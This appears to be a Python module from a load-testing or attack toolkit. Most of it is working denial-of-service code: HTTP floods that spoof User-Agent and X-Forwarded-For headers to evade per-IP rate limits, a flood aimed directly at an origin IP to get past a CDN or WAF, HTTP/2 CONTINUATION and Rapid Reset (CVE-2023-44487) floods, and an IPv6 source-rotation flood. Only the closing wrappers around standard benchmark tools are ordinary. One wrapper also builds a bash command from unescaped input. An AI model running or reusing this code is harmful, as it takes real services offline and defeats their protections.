from __future__ import annotations

import asyncio
import json
import os
import random
import ssl as _ssl
import statistics
import struct
import tempfile
import time

import aiohttp

from ._base import _run_cmd, _tool_available
from .state import STATE

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "curl/8.1.2",
    "okhttp/4.12.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UQ1A.240105.004)",
]

_LANG_POOL = ["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9", "ja-JP,ja;q=0.9"]


def _random_ip() -> str:
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def _spoof_headers(extra: dict | None = None) -> dict:
    ip = _random_ip()
    h = {
        "User-Agent": random.choice(_UA_POOL),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Accept-Language": random.choice(_LANG_POOL),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    if extra:
        h.update(extra)
    return h


async def http_flood(
    url: str, method: str = "GET", concurrent: int = 100,
    duration_seconds: int = 15, headers: dict | None = None, body: str | None = None,
) -> dict:
    concurrent = min(concurrent, 1000)
    duration_seconds = min(duration_seconds, 120)

    total = 0
    success = 0
    errors = 0
    times: list[float] = []
    statuses: dict[int, int] = {}
    sem = asyncio.Semaphore(concurrent)
    stop_event = asyncio.Event()

    async def _worker(session: aiohttp.ClientSession):
        nonlocal total, success, errors
        while not stop_event.is_set():
            async with sem:
                if stop_event.is_set():
                    break
                try:
                    kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
                    if headers:
                        kwargs["headers"] = headers
                    if body:
                        kwargs["data"] = body
                    start = time.monotonic()
                    async with session.request(method, url, **kwargs) as resp:
                        await resp.read()
                        elapsed = (time.monotonic() - start) * 1000
                        total += 1
                        times.append(elapsed)
                        statuses[resp.status] = statuses.get(resp.status, 0) + 1
                        if 200 <= resp.status < 500:
                            success += 1
                        STATE.total_requests_sent += 1
                except Exception:
                    total += 1
                    errors += 1

    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [asyncio.create_task(_worker(session)) for _ in range(concurrent)]
        await asyncio.sleep(duration_seconds)
        stop_event.set()
        await asyncio.gather(*workers, return_exceptions=True)

    return {
        "url": url, "concurrent": concurrent, "duration_seconds": duration_seconds,
        "total_requests": total, "successful": success, "errors": errors,
        "rps": round(total / max(duration_seconds, 1), 2),
        "avg_ms": round(statistics.mean(times), 2) if times else None,
        "p95_ms": round(sorted(times)[int(len(times) * 0.95)], 2) if len(times) > 1 else None,
        "status_distribution": statuses,
        "error_rate_pct": round(errors / max(total, 1) * 100, 2),
    }


async def spoof_flood(
    url: str, concurrent: int = 200, duration_seconds: int = 30,
    method: str = "GET", body: str | None = None, extra_headers: dict | None = None,
) -> dict:
    concurrent = min(concurrent, 1000)
    duration_seconds = min(duration_seconds, 120)

    total = 0
    success = 0
    errors = 0
    times: list[float] = []
    statuses: dict[int, int] = {}
    sem = asyncio.Semaphore(concurrent)
    stop_event = asyncio.Event()

    async def _worker(session: aiohttp.ClientSession):
        nonlocal total, success, errors
        while not stop_event.is_set():
            async with sem:
                if stop_event.is_set():
                    break
                try:
                    hdrs = _spoof_headers(extra_headers)
                    kwargs: dict = {
                        "timeout": aiohttp.ClientTimeout(total=10),
                        "ssl": False, "headers": hdrs,
                    }
                    if body:
                        kwargs["data"] = body
                    start = time.monotonic()
                    async with session.request(method, url, **kwargs) as resp:
                        await resp.read()
                        elapsed = (time.monotonic() - start) * 1000
                        total += 1
                        times.append(elapsed)
                        statuses[resp.status] = statuses.get(resp.status, 0) + 1
                        if 200 <= resp.status < 500:
                            success += 1
                        STATE.total_requests_sent += 1
                except Exception:
                    total += 1
                    errors += 1

    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [asyncio.create_task(_worker(session)) for _ in range(concurrent)]
        await asyncio.sleep(duration_seconds)
        stop_event.set()
        await asyncio.gather(*workers, return_exceptions=True)

    return {
        "url": url, "attack_type": "spoof_flood",
        "concurrent": concurrent, "duration_seconds": duration_seconds,
        "total_requests": total, "successful": success, "errors": errors,
        "rps": round(total / max(duration_seconds, 1), 2),
        "avg_ms": round(statistics.mean(times), 2) if times else None,
        "p95_ms": round(sorted(times)[int(len(times) * 0.95)], 2) if len(times) > 1 else None,
        "status_distribution": statuses,
        "error_rate_pct": round(errors / max(total, 1) * 100, 2),
        "evasion": "Rotated User-Agent + X-Forwarded-For per request to bypass per-IP rate limiting",
    }


async def flood_origin(
    origin_ip: str, host: str, port: int = 80,
    path: str = "/", scheme: str = "http",
    concurrent: int = 300, duration_seconds: int = 30,
) -> dict:
    url = f"{scheme}://{origin_ip}:{port}{path}"
    result = await spoof_flood(
        url=url, concurrent=concurrent, duration_seconds=duration_seconds,
        extra_headers={"Host": host},
    )
    result["attack_type"] = "origin_bypass_flood"
    result["origin_ip"] = origin_ip
    result["spoofed_host"] = host
    result["note"] = "Connecting directly to origin IP bypasses CDN/WAF protection"
    return result


async def http2_continuation_flood(
    host: str, port: int = 443, connections: int = 10, duration_seconds: int = 60,
) -> dict:
    duration_seconds = min(duration_seconds, 120)
    connections = min(connections, 50)

    total_frames = 0
    conn_errors = 0
    stop_event = asyncio.Event()

    def _frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
        l = len(payload)
        return struct.pack(">I", l)[1:4] + bytes([ftype, flags]) + struct.pack(">I", stream_id & 0x7FFFFFFF) + payload

    def _settings_frame() -> bytes:
        return _frame(0x4, 0, 0, b"")

    def _headers_no_end(stream_id: int) -> bytes:
        return _frame(0x1, 0x0, stream_id, bytes([0x82]))

    def _continuation_frame(stream_id: int) -> bytes:
        return _frame(0x9, 0x0, stream_id, bytes([0x00] * 16))

    async def _connection():
        nonlocal total_frames, conn_errors
        try:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=10
            )
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + _settings_frame())
            await writer.drain()
            stream_id = 1
            local = 0
            while not stop_event.is_set() and stream_id < 2 ** 30:
                batch = _headers_no_end(stream_id)
                for _ in range(500):
                    if stop_event.is_set():
                        break
                    batch += _continuation_frame(stream_id)
                    local += 1
                writer.write(batch)
                await writer.drain()
                stream_id += 2
            total_frames += local
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except Exception:
            conn_errors += 1

    tasks = [asyncio.create_task(_connection()) for _ in range(connections)]
    await asyncio.sleep(duration_seconds)
    stop_event.set()
    await asyncio.gather(*tasks, return_exceptions=True)

    return {
        "host": host, "port": port,
        "attack_type": "http2_continuation_flood",
        "connections": connections,
        "duration_seconds": duration_seconds,
        "total_continuation_frames": total_frames,
        "frames_per_second": round(total_frames / max(duration_seconds, 1)),
        "connection_errors": conn_errors,
        "note": "HEADERS without END_HEADERS followed by unbounded CONTINUATION frames — server holds stream open in header-receiving state, cannot close or process until END_HEADERS arrives",
    }


async def ipv6_prefix_flood(
    url: str, ipv6_prefix: str, concurrent: int = 500,
    duration_seconds: int = 60, method: str = "GET", body: str | None = None,
) -> dict:
    import ipaddress

    try:
        network = ipaddress.IPv6Network(ipv6_prefix, strict=False)
    except ValueError as e:
        return {"error": f"invalid_ipv6_prefix: {e}"}

    total_addrs = network.num_addresses
    if total_addrs < 2:
        return {"error": "prefix too small"}

    concurrent = min(concurrent, 2000)
    duration_seconds = min(duration_seconds, 120)

    total = 0
    success = 0
    errors = 0
    times: list[float] = []
    statuses: dict[int, int] = {}
    stop_event = asyncio.Event()

    def _rand_ipv6() -> str:
        offset = random.randint(1, min(total_addrs - 1, 2 ** 32 - 1))
        return str(network.network_address + offset)

    async def _worker():
        nonlocal total, success, errors
        while not stop_event.is_set():
            src_ip = _rand_ipv6()
            try:
                connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, local_addr=(src_ip, 0))
                async with aiohttp.ClientSession(connector=connector) as session:
                    kwargs: dict = {
                        "timeout": aiohttp.ClientTimeout(total=10),
                        "ssl": False,
                        "headers": _spoof_headers(),
                    }
                    if body:
                        kwargs["data"] = body
                    start = time.monotonic()
                    async with session.request(method, url, **kwargs) as resp:
                        await resp.read()
                        elapsed = (time.monotonic() - start) * 1000
                        total += 1
                        times.append(elapsed)
                        statuses[resp.status] = statuses.get(resp.status, 0) + 1
                        if 200 <= resp.status < 500:
                            success += 1
                        STATE.total_requests_sent += 1
            except Exception:
                total += 1
                errors += 1

    workers = [asyncio.create_task(_worker()) for _ in range(concurrent)]
    await asyncio.sleep(duration_seconds)
    stop_event.set()
    await asyncio.gather(*workers, return_exceptions=True)

    return {
        "url": url, "ipv6_prefix": ipv6_prefix, "attack_type": "ipv6_prefix_flood",
        "concurrent": concurrent, "duration_seconds": duration_seconds,
        "total_requests": total, "successful": success, "errors": errors,
        "rps": round(total / max(duration_seconds, 1), 2),
        "avg_ms": round(statistics.mean(times), 2) if times else None,
        "p95_ms": round(sorted(times)[int(len(times) * 0.95)], 2) if len(times) > 1 else None,
        "status_distribution": statuses,
        "error_rate_pct": round(errors / max(total, 1) * 100, 2),
        "note": "Each TCP connection uses a unique source IPv6 from the prefix — bypasses per-IP CDN rate limiting at the edge",
    }


async def http2_rapid_reset(
    host: str, port: int = 443, connections: int = 10, duration_seconds: int = 60,
) -> dict:
    duration_seconds = min(duration_seconds, 120)
    connections = min(connections, 100)

    total_resets = 0
    conn_errors = 0
    stop_event = asyncio.Event()

    def _frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
        l = len(payload)
        return struct.pack(">I", l)[1:4] + bytes([ftype, flags]) + struct.pack(">I", stream_id & 0x7FFFFFFF) + payload

    def _headers_frame(stream_id: int) -> bytes:
        hpack = bytes([0x82, 0x84, 0x87, 0x01]) + bytes([len(host)]) + host.encode()
        return _frame(0x1, 0x4, stream_id, hpack)

    def _rst_frame(stream_id: int) -> bytes:
        return _frame(0x3, 0, stream_id, struct.pack(">I", 0x8))

    def _settings_frame() -> bytes:
        return _frame(0x4, 0, 0, b"")

    async def _connection():
        nonlocal total_resets, conn_errors
        try:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=10
            )
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + _settings_frame())
            await writer.drain()
            stream_id = 1
            local = 0
            while not stop_event.is_set() and stream_id < 2 ** 30:
                batch = b""
                for _ in range(100):
                    if stop_event.is_set():
                        break
                    batch += _headers_frame(stream_id) + _rst_frame(stream_id)
                    stream_id += 2
                    local += 1
                writer.write(batch)
                await writer.drain()
            total_resets += local
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except Exception:
            conn_errors += 1

    tasks = [asyncio.create_task(_connection()) for _ in range(connections)]
    await asyncio.sleep(duration_seconds)
    stop_event.set()
    await asyncio.gather(*tasks, return_exceptions=True)

    return {
        "host": host, "port": port,
        "attack_type": "http2_rapid_reset",
        "connections": connections,
        "duration_seconds": duration_seconds,
        "total_rst_streams": total_resets,
        "rst_per_second": round(total_resets / max(duration_seconds, 1)),
        "connection_errors": conn_errors,
        "note": "CVE-2023-44487 — HEADERS+RST_STREAM loop forces server to allocate/free stream state continuously",
    }


async def bombardier_load(
    url: str, connections: int = 200, duration_seconds: int = 15,
    method: str = "GET", body: str = "", rate: int = 0,
) -> dict:
    if not _tool_available("bombardier"):
        return {"error": "bombardier not installed"}

    connections = min(connections, 2000)
    duration_seconds = min(duration_seconds, 120)
    cmd = [
        "bombardier", "-c", str(connections), "-d", f"{duration_seconds}s",
        "-m", method, "--print", "result", "--format", "json",
    ]
    if body:
        cmd += ["-b", body]
    if rate > 0:
        cmd += ["-r", str(rate)]
    cmd.append(url)

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    if "error" in result:
        return result

    try:
        data = json.loads(result["stdout"])
        res = data.get("result", {})
        return {
            "url": url, "connections": connections, "duration_seconds": duration_seconds,
            "requests_total": res.get("numReqs", 0),
            "rps": res.get("rps", {}).get("mean", 0),
            "latency_avg_ms": res.get("latency", {}).get("mean", 0) / 1000,
            "latency_p99_ms": res.get("latency", {}).get("percentiles", {}).get("99", 0) / 1000,
            "status_distribution": res.get("statusCodeDistribution", {}),
        }
    except Exception:
        return {"raw_output": result["stdout"][:5000]}


async def vegeta_attack(
    url: str, rate: int = 500, duration_seconds: int = 10,
    method: str = "GET", headers: dict | None = None, body: str = "",
) -> dict:
    if not _tool_available("vegeta"):
        return {"error": "vegeta not installed"}

    duration_seconds = min(duration_seconds, 120)
    rate = min(rate, 10000)

    target_spec = f"{method} {url}\n"
    if headers:
        for k, v in headers.items():
            target_spec += f"{k}: {v}\n"
    if body:
        target_spec += f"@<STDIN>\n{body}"

    attack_cmd = f"echo '{target_spec}' | vegeta attack -rate={rate}/s -duration={duration_seconds}s | vegeta report -type=json"
    result = await _run_cmd(["bash", "-c", attack_cmd], timeout=duration_seconds + 30)
    if "error" in result:
        return result

    try:
        data = json.loads(result["stdout"])
        return {
            "url": url, "rate_per_second": rate, "duration_seconds": duration_seconds,
            "requests_total": data.get("requests", 0),
            "throughput_rps": data.get("throughput", 0),
            "success_ratio": data.get("success", 0),
            "latency_mean_ms": data.get("latencies", {}).get("mean", 0) / 1e6,
            "latency_p95_ms": data.get("latencies", {}).get("95th", 0) / 1e6,
            "latency_p99_ms": data.get("latencies", {}).get("99th", 0) / 1e6,
            "latency_max_ms": data.get("latencies", {}).get("max", 0) / 1e6,
            "status_codes": data.get("status_codes", {}),
        }
    except Exception:
        return {"raw_output": result["stdout"][:5000]}


async def wrk_benchmark(
    url: str, threads: int = 4, connections: int = 100,
    duration_seconds: int = 15, script: str = "",
) -> dict:
    if not _tool_available("wrk"):
        return {"error": "wrk not installed"}

    import re
    connections = min(connections, 5000)
    cmd = ["wrk", "-t", str(threads), "-c", str(connections), "-d", f"{duration_seconds}s", "--latency"]
    if script:
        cmd += ["-s", script]
    cmd.append(url)

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    if "error" in result:
        return result

    output = result["stdout"]
    parsed: dict = {"url": url, "threads": threads, "connections": connections, "raw_output": output[:3000]}
    for pattern, key in [
        (r"Requests/sec:\s+([\d.]+)", "requests_per_second"),
        (r"Transfer/sec:\s+([\d.]+\w+)", "transfer_per_second"),
    ]:
        m = re.search(pattern, output)
        if m:
            parsed[key] = m.group(1)
    return parsed


async def siege_load(
    url: str, concurrent: int = 50, duration_seconds: int = 15, extra_args: str = "",
) -> dict:
    if not _tool_available("siege"):
        return {"error": "siege not installed"}

    cmd = ["siege", "-c", str(min(concurrent, 1000)), "-t", f"{duration_seconds}S", "--no-parser", url]
    if extra_args:
        cmd += extra_args.split()
    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    return {
        "url": url, "concurrent": concurrent,
        "raw_output": result.get("stderr", "")[:5000] + result.get("stdout", "")[:2000],
    }


async def k6_load(url: str, vus: int = 50, duration_seconds: int = 30) -> dict:
    if not _tool_available("k6"):
        return {"error": "k6 not installed", "hint": "scoop install k6 or https://k6.io/docs/get-started/installation/"}

    vus = min(vus, 500)
    duration_seconds = min(duration_seconds, 120)
    script = f"""
import http from 'k6/http';
import {{ check }} from 'k6';
export const options = {{ vus: {vus}, duration: '{duration_seconds}s' }};
export default function () {{
  const res = http.get('{url}');
  check(res, {{ 'status ok': (r) => r.status < 500 }});
}}
"""
    script_fd, script_path = tempfile.mkstemp(suffix=".js")
    summary_fd, summary_path = tempfile.mkstemp(suffix=".json")
    try:
        with os.fdopen(script_fd, "w") as f:
            f.write(script)
        os.close(summary_fd)
        result = await _run_cmd(
            ["k6", "run", f"--summary-export={summary_path}", script_path],
            timeout=duration_seconds + 30,
        )
        summary: dict = {}
        try:
            with open(summary_path, encoding="utf-8") as f:
                summary = json.load(f)
        except Exception:
            pass
        return {
            "url": url, "vus": vus, "duration_seconds": duration_seconds,
            "stdout": result.get("stdout", "")[:4000], "summary": summary,
            "exit_code": result.get("exit_code"),
        }
    finally:
        for p in [script_path, summary_path]:
            try:
                os.unlink(p)
            except Exception:
                pass


async def h2load_flood(
    url: str, connections: int = 100, streams: int = 10, duration_seconds: int = 30,
) -> dict:
    connections = min(connections, 1000)
    streams = min(streams, 256)
    duration_seconds = min(duration_seconds, 120)

    if _tool_available("h2load"):
        result = await _run_cmd(
            ["h2load", "-c", str(connections), "-m", str(streams), "-D", str(duration_seconds), url],
            timeout=duration_seconds + 30,
        )
        return {
            "tool": "h2load", "url": url, "connections": connections,
            "streams_per_connection": streams,
            "total_concurrent_streams": connections * streams,
            "duration_seconds": duration_seconds,
            "stdout": result.get("stdout", "")[:5000],
            "exit_code": result.get("exit_code"),
        }

    if _tool_available("bombardier"):
        result = await _run_cmd(
            ["bombardier", "--http2", "-c", str(connections), "-d", f"{duration_seconds}s",
             "--print", "r", "--format", "json", url],
            timeout=duration_seconds + 30,
        )
        return {"tool": "bombardier_http2_fallback", "url": url, "connections": connections, "stdout": result.get("stdout", "")[:4000]}

    return {"error": "h2load not installed", "hint": "apt install nghttp2-client OR brew install nghttp2"}
